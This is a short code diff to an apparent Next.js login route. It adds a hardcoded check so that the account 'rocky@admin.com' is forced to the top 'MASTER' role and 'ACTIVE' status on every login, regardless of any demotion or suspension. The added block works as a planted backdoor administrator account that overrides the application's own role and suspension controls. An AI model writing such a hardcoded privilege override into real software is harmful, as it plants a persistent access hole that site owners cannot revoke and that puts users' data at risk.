@@ -63,6 +63,14 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Invalid email or password' }, { status: 401 });
     }
 
+    // Ensure rocky@admin.com is perpetually MASTER
+    if (normalizedEmail === 'rocky@admin.com' && user.role !== 'MASTER') {
+      user = await prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'MASTER', status: 'ACTIVE' },
+      });
+    }
+
     const token = await createSessionToken(user.id, user.email, user.role);
     await setSessionCookie(token);
 
